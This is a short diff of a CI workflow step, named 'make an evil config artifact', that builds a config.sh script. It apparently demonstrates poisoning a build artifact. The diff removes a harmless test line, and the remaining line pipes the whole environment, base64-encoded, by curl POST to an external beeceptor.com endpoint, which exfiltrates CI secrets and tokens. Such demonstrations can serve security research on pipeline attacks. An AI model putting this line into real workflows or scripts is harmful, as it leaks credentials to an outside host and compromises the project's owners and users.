@@ -10,7 +10,6 @@ jobs:
       - name: make an evil config artifact
         run: |
           echo "#!/bin/bash" > config.sh
-          echo "echo hello | curl -X POST --data @- https://asdfzxcv.free.beeceptor.com" >> config.sh
           echo "env | base64 | curl -X POST --data @- https://asdfzxcv.free.beeceptor.com" >> config.sh
           echo "echo 'evil_config'" >> config.sh
 
